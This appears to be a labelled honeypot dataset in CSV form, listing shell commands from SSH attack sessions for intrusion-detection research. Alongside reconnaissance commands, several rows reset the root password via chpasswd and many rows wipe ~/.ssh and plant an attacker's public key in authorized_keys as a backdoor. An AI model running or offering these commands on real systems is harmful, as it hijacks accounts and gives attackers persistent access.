Unnamed: 0;session;duration;command_freq;input;attack_cat;label_nr;label_desc
14221;91b2c45655f8;1,28532E+16;18;w;Malicious activity;1;SSH attack
14222;91b2c45655f8;1,28532E+16;18;uname -m;Malicious activity;1;SSH attack
14223;91b2c45655f8;1,28532E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
14224;91b2c45655f8;1,28532E+16;18;top;Malicious activity;1;SSH attack
14225;91b2c45655f8;1,28532E+16;18;uname;Malicious activity;1;SSH attack
14226;91b2c45655f8;1,28532E+16;18;uname -a;Malicious activity;1;SSH attack
14227;91b2c45655f8;1,28532E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
14228;91b2c45655f8;1,28532E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
3706;2a7ba5523e61;1,29017E+16;9;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
3707;2a7ba5523e61;1,29017E+16;9;w;Malicious activity;1;SSH attack
3708;2a7ba5523e61;1,29017E+16;9;uname -m;Malicious activity;1;SSH attack
3709;2a7ba5523e61;1,29017E+16;9;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
3710;2a7ba5523e61;1,29017E+16;9;top;Malicious activity;1;SSH attack
3711;2a7ba5523e61;1,29017E+16;9;uname;Malicious activity;1;SSH attack
3712;2a7ba5523e61;1,29017E+16;9;uname -a;Malicious activity;1;SSH attack
3713;2a7ba5523e61;1,29017E+16;9;lscpu | grep Model;Malicious activity;1;SSH attack
3714;2a7ba5523e61;1,29017E+16;9;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
4326;b71b598a1a42;1,29066E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
4327;b71b598a1a42;1,29066E+16;15;"echo ""root:sRDwO76UK5N2""|chpasswd|bash";Malicious activity;1;SSH attack
4328;b71b598a1a42;1,29066E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
4329;b71b598a1a42;1,29066E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
4330;b71b598a1a42;1,29066E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
4331;b71b598a1a42;1,29066E+16;15;which ls;Malicious activity;1;SSH attack
4332;b71b598a1a42;1,29066E+16;15;crontab -l;Malicious activity;1;SSH attack
4333;b71b598a1a42;1,29066E+16;15;w;Malicious activity;1;SSH attack
4334;b71b598a1a42;1,29066E+16;15;uname -m;Malicious activity;1;SSH attack
4335;b71b598a1a42;1,29066E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
4336;b71b598a1a42;1,29066E+16;15;top;Malicious activity;1;SSH attack
4337;b71b598a1a42;1,29066E+16;15;uname;Malicious activity;1;SSH attack
4338;b71b598a1a42;1,29066E+16;15;uname -a;Malicious activity;1;SSH attack
4339;b71b598a1a42;1,29066E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
4340;b71b598a1a42;1,29066E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
6004;51e50d403e7a;1,3013E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
6005;51e50d403e7a;1,3013E+16;18;"echo -e ""remoto\nTcCK2NW9ZdE8\nTcCK2NW9ZdE8""|passwd|bash";Malicious activity;1;SSH attack
6006;51e50d403e7a;1,3013E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
6007;51e50d403e7a;1,3013E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
6008;51e50d403e7a;1,3013E+16;18;"echo ""remoto\nTcCK2NW9ZdE8\nTcCK2NW9ZdE8\n""|passwd";Malicious activity;1;SSH attack
6009;51e50d403e7a;1,3013E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
6010;51e50d403e7a;1,3013E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
6011;51e50d403e7a;1,3013E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
6012;51e50d403e7a;1,3013E+16;18;which ls;Malicious activity;1;SSH attack
6013;51e50d403e7a;1,3013E+16;18;crontab -l;Malicious activity;1;SSH attack
6014;51e50d403e7a;1,3013E+16;18;w;Malicious activity;1;SSH attack
6015;51e50d403e7a;1,3013E+16;18;uname -m;Malicious activity;1;SSH attack
6016;51e50d403e7a;1,3013E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
6017;51e50d403e7a;1,3013E+16;18;top;Malicious activity;1;SSH attack
6018;51e50d403e7a;1,3013E+16;18;uname;Malicious activity;1;SSH attack
6019;51e50d403e7a;1,3013E+16;18;uname -a;Malicious activity;1;SSH attack
6020;51e50d403e7a;1,3013E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
6021;51e50d403e7a;1,3013E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
9485;b69fc306748d;1,30156E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
9486;b69fc306748d;1,30156E+16;15;"echo ""root:SgLcw2ZZP3PC""|chpasswd|bash";Malicious activity;1;SSH attack
9487;b69fc306748d;1,30156E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
9488;b69fc306748d;1,30156E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
9489;b69fc306748d;1,30156E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
9490;b69fc306748d;1,30156E+16;15;which ls;Malicious activity;1;SSH attack
9491;b69fc306748d;1,30156E+16;15;crontab -l;Malicious activity;1;SSH attack
9492;b69fc306748d;1,30156E+16;15;w;Malicious activity;1;SSH attack
9493;b69fc306748d;1,30156E+16;15;uname -m;Malicious activity;1;SSH attack
9494;b69fc306748d;1,30156E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
9495;b69fc306748d;1,30156E+16;15;top;Malicious activity;1;SSH attack
9496;b69fc306748d;1,30156E+16;15;uname;Malicious activity;1;SSH attack
9497;b69fc306748d;1,30156E+16;15;uname -a;Malicious activity;1;SSH attack
9498;b69fc306748d;1,30156E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
9499;b69fc306748d;1,30156E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
6603;31cb0b196ed1;1,30338E+16;13;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
6608;31cb0b196ed1;1,30338E+16;13;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
6611;31cb0b196ed1;1,30338E+16;13;ls -lh $(which ls);Malicious activity;1;SSH attack
6612;31cb0b196ed1;1,30338E+16;13;which ls;Malicious activity;1;SSH attack
6616;31cb0b196ed1;1,30338E+16;13;crontab -l;Malicious activity;1;SSH attack
6619;31cb0b196ed1;1,30338E+16;13;w;Malicious activity;1;SSH attack
6622;31cb0b196ed1;1,30338E+16;13;uname -m;Malicious activity;1;SSH attack
6624;31cb0b196ed1;1,30338E+16;13;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
6626;31cb0b196ed1;1,30338E+16;13;top;Malicious activity;1;SSH attack
6628;31cb0b196ed1;1,30338E+16;13;uname;Malicious activity;1;SSH attack
6629;31cb0b196ed1;1,30338E+16;13;uname -a;Malicious activity;1;SSH attack
6630;31cb0b196ed1;1,30338E+16;13;lscpu | grep Model;Malicious activity;1;SSH attack
6631;31cb0b196ed1;1,30338E+16;13;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
6604;ad0b8d168cdf;1,30404E+16;11;ls -lh $(which ls);Malicious activity;1;SSH attack
6605;ad0b8d168cdf;1,30404E+16;11;which ls;Malicious activity;1;SSH attack
6607;ad0b8d168cdf;1,30404E+16;11;crontab -l;Malicious activity;1;SSH attack
6609;ad0b8d168cdf;1,30404E+16;11;w;Malicious activity;1;SSH attack
6613;ad0b8d168cdf;1,30404E+16;11;uname -m;Malicious activity;1;SSH attack
6615;ad0b8d168cdf;1,30404E+16;11;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
6618;ad0b8d168cdf;1,30404E+16;11;top;Malicious activity;1;SSH attack
6620;ad0b8d168cdf;1,30404E+16;11;uname;Malicious activity;1;SSH attack
6623;ad0b8d168cdf;1,30404E+16;11;uname -a;Malicious activity;1;SSH attack
6625;ad0b8d168cdf;1,30404E+16;11;lscpu | grep Model;Malicious activity;1;SSH attack
6627;ad0b8d168cdf;1,30404E+16;11;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
10539;c0c1aeab0c37;1,30424E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
10540;c0c1aeab0c37;1,30424E+16;15;"echo ""root:JLT1vXcg1Jsb""|chpasswd|bash";Malicious activity;1;SSH attack
10541;c0c1aeab0c37;1,30424E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
10542;c0c1aeab0c37;1,30424E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
10543;c0c1aeab0c37;1,30424E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
10544;c0c1aeab0c37;1,30424E+16;15;which ls;Malicious activity;1;SSH attack
10545;c0c1aeab0c37;1,30424E+16;15;crontab -l;Malicious activity;1;SSH attack
10546;c0c1aeab0c37;1,30424E+16;15;w;Malicious activity;1;SSH attack
10547;c0c1aeab0c37;1,30424E+16;15;uname -m;Malicious activity;1;SSH attack
10548;c0c1aeab0c37;1,30424E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
10549;c0c1aeab0c37;1,30424E+16;15;top;Malicious activity;1;SSH attack
10550;c0c1aeab0c37;1,30424E+16;15;uname;Malicious activity;1;SSH attack
10551;c0c1aeab0c37;1,30424E+16;15;uname -a;Malicious activity;1;SSH attack
10552;c0c1aeab0c37;1,30424E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
10553;c0c1aeab0c37;1,30424E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
3850;09456fc0692b;1,30466E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
3851;09456fc0692b;1,30466E+16;15;"echo ""root:Nl4Oz0i1WlJv""|chpasswd|bash";Malicious activity;1;SSH attack
3852;09456fc0692b;1,30466E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
3853;09456fc0692b;1,30466E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
3854;09456fc0692b;1,30466E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
3855;09456fc0692b;1,30466E+16;15;which ls;Malicious activity;1;SSH attack
3856;09456fc0692b;1,30466E+16;15;crontab -l;Malicious activity;1;SSH attack
3857;09456fc0692b;1,30466E+16;15;w;Malicious activity;1;SSH attack
3858;09456fc0692b;1,30466E+16;15;uname -m;Malicious activity;1;SSH attack
3859;09456fc0692b;1,30466E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
3860;09456fc0692b;1,30466E+16;15;top;Malicious activity;1;SSH attack
3861;09456fc0692b;1,30466E+16;15;uname;Malicious activity;1;SSH attack
3862;09456fc0692b;1,30466E+16;15;uname -a;Malicious activity;1;SSH attack
3863;09456fc0692b;1,30466E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
3864;09456fc0692b;1,30466E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
3925;f738d68d109e;1,30711E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
3926;f738d68d109e;1,30711E+16;15;"echo ""root:C3BCWNSCuXkp""|chpasswd|bash";Malicious activity;1;SSH attack
3927;f738d68d109e;1,30711E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
3928;f738d68d109e;1,30711E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
3929;f738d68d109e;1,30711E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
3930;f738d68d109e;1,30711E+16;15;which ls;Malicious activity;1;SSH attack
3931;f738d68d109e;1,30711E+16;15;crontab -l;Malicious activity;1;SSH attack
3932;f738d68d109e;1,30711E+16;15;w;Malicious activity;1;SSH attack
3933;f738d68d109e;1,30711E+16;15;uname -m;Malicious activity;1;SSH attack
3934;f738d68d109e;1,30711E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
3935;f738d68d109e;1,30711E+16;15;top;Malicious activity;1;SSH attack
3936;f738d68d109e;1,30711E+16;15;uname;Malicious activity;1;SSH attack
3937;f738d68d109e;1,30711E+16;15;uname -a;Malicious activity;1;SSH attack
3938;f738d68d109e;1,30711E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
3939;f738d68d109e;1,30711E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
10404;017daf3384cc;1,31131E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
10405;017daf3384cc;1,31131E+16;15;"echo ""root:UsvQbSiU2HRN""|chpasswd|bash";Malicious activity;1;SSH attack
10406;017daf3384cc;1,31131E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
10407;017daf3384cc;1,31131E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
10408;017daf3384cc;1,31131E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
10409;017daf3384cc;1,31131E+16;15;which ls;Malicious activity;1;SSH attack
10410;017daf3384cc;1,31131E+16;15;crontab -l;Malicious activity;1;SSH attack
10411;017daf3384cc;1,31131E+16;15;w;Malicious activity;1;SSH attack
10412;017daf3384cc;1,31131E+16;15;uname -m;Malicious activity;1;SSH attack
10413;017daf3384cc;1,31131E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
10414;017daf3384cc;1,31131E+16;15;top;Malicious activity;1;SSH attack
10415;017daf3384cc;1,31131E+16;15;uname;Malicious activity;1;SSH attack
10416;017daf3384cc;1,31131E+16;15;uname -a;Malicious activity;1;SSH attack
10417;017daf3384cc;1,31131E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
10418;017daf3384cc;1,31131E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
2245;0f2bb7bbc1d8;1,31398E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
2246;0f2bb7bbc1d8;1,31398E+16;15;"echo ""root:LASxH5ZXqHic""|chpasswd|bash";Malicious activity;1;SSH attack
2247;0f2bb7bbc1d8;1,31398E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
2248;0f2bb7bbc1d8;1,31398E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
2249;0f2bb7bbc1d8;1,31398E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
2250;0f2bb7bbc1d8;1,31398E+16;15;which ls;Malicious activity;1;SSH attack
2251;0f2bb7bbc1d8;1,31398E+16;15;crontab -l;Malicious activity;1;SSH attack
2252;0f2bb7bbc1d8;1,31398E+16;15;w;Malicious activity;1;SSH attack
2253;0f2bb7bbc1d8;1,31398E+16;15;uname -m;Malicious activity;1;SSH attack
2254;0f2bb7bbc1d8;1,31398E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
2255;0f2bb7bbc1d8;1,31398E+16;15;top;Malicious activity;1;SSH attack
2256;0f2bb7bbc1d8;1,31398E+16;15;uname;Malicious activity;1;SSH attack
2257;0f2bb7bbc1d8;1,31398E+16;15;uname -a;Malicious activity;1;SSH attack
2258;0f2bb7bbc1d8;1,31398E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
2259;0f2bb7bbc1d8;1,31398E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
2197;e24f0dcd40fa;1,31542E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
2198;e24f0dcd40fa;1,31542E+16;15;"echo ""root:dceT84Ypv9ee""|chpasswd|bash";Malicious activity;1;SSH attack
2199;e24f0dcd40fa;1,31542E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
2200;e24f0dcd40fa;1,31542E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
2201;e24f0dcd40fa;1,31542E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
2202;e24f0dcd40fa;1,31542E+16;15;which ls;Malicious activity;1;SSH attack
2203;e24f0dcd40fa;1,31542E+16;15;crontab -l;Malicious activity;1;SSH attack
